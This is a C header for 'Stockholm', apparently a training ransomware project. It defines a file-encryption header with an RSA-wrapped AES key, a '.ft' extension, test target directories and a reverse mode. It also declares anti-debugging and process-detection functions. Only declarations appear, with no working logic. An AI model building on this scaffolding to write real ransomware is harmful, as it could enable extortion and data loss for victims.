#ifndef STOCKHOLM_H
# define STOCKHOLM_H

# include <stdio.h>
# include <stdlib.h>
# include <fcntl.h>
# include <unistd.h>
# include <stdint.h>
# include <sys/mman.h>  // For mapping
# include <elf.h>       // For ELF header
# include <string.h>
# include <time.h>      // For rand & srand (encryption key generation)
# include <dirent.h>    // For looping through directory
# include <stdbool.h>

/*-------------------------------- Colors ---------------------------------*/

/* Text colors */
# define FA_RED_COLOR           "\033[31m"
# define FA_GREEN_COLOR         "\033[32m"
# define FA_YELLOW_COLOR        "\033[33m"
# define FA_RESET_COLOR         "\033[0m"

/* Background colors */
# define FA_RESET_BG_COLOR      "\033[49m"

/*------------------------ Defines, enum, struct --------------------------*/

# define FA_TARGET_ARRAY_SIZE   2
// Paths of the target directories
# define FA_TARGET_PATHS        {"/tmp/test/", "/tmp/test2/"}
// Error code
# define FA_ERROR               1
// Common value representing the size of a memory page in many computer systems
# define FA_PAGE_SIZE           4096

// Charset used for the encryption key
# define FA_KEYCHARSET          "abcdefghijklmnopqrstuvwxyz" \
                                "ABCDEFGHIJKLMNOPQRSTUVWXYZ" \
                                "0123456789"
// Signature injected in the target files's Stockholm header
# define FA_SIGNATURE           "STOCKHLM"
# define FA_STOCKHLM_EXT        ".ft"
# define FA_STOCKHLM_EXT_LEN    3

enum fa_e_modes
{
    // Display detailed notifications
    FA_VERBOSE                  = 1,
    FA_REVERSE                  = 2
};

enum fa_e_stockhlm_header
{
    FA_NEW_HEADER_SIZE          = 0x0118,
    FA_MAGICNBR_LEN             = 8,
    FA_AES_ENCRYPT_KEY_LEN      = 256,

    // Header offsets
    FA_HDR_OFF_SIGN             = 0x0,
    FA_HDR_OFF_ENCRYPT_KEY_LEN  = 0x8,
    FA_HDR_OFF_ENCRYPT_KEY      = 0xc,
    FA_HDR_OFF_FILETYPE         = 0x10c,
    FA_HDR_OFF_FILESIZE         = 0x110
};

/*
 * This is the Stockholm header that is written before the original header.
 * It has a size of 0x0118 (= 280) bytes.
 */

typedef struct fa_s_stockhlm_header
{
    // 0x0000 Magic value/signature to identify encrypted files.
    uint8_t     signature[FA_MAGICNBR_LEN];

    /*
     * 0x0008 Size (in bytes) of the encrypted AES key.
     * Typically 256 bytes for a 2048-bit RSA key.
     */

    uint32_t    encrypted_key_len;

    /*
     * 0x000C RSA encrypted AES file encryption key.
     * AES-128 key (16 bytes) is encrypted using RSA-2048 and stored here.
     *
     * If the asymmetric encryption mode is disabled, a unencrypted
     * AES-128 key is stored.
     */

    uint8_t     encryption_key[FA_AES_ENCRYPT_KEY_LEN];

    /*
     * 0x010C File type internal to this program.
     * 
     * This is the original file type of the encrypted file.
     * It is used during decryption to restore file format.
     */

    uint32_t    original_filetype;

    // 0x0110 Original file size
    uint64_t    original_filesize;

    // 0x0118 Encrypted file contents  (AES-128 CBC)
}               fa_t_stockhlm_header;

/*---------------------------- Global variables ---------------------------*/

extern unsigned char        *g_mapped_data; // file is mapped in memory here
extern uint16_t             g_modes;        // options given from command line
extern fa_t_stockhlm_header g_stockhlm_header;

/*---------------------------- Function prototypes ------------------------*/

char    *fa_get_filename(char *argv[]);
int     fa_map_file_into_memory(const char *filename);
int     fa_process_mapped_data(void);
int     fa_write_processed_data_to_file(char *target_path);
void    xor_with_additive_cipher(
    void *key, size_t key_length, void *data, size_t data_length, int mode);
char    *fa_keygen(const char *_charset, size_t strength);
void    fa_parse_argv(char *argv[]);
int     pc_is_debugger_attached(void);
int     pc_is_process_running(const char *process_name);

#endif
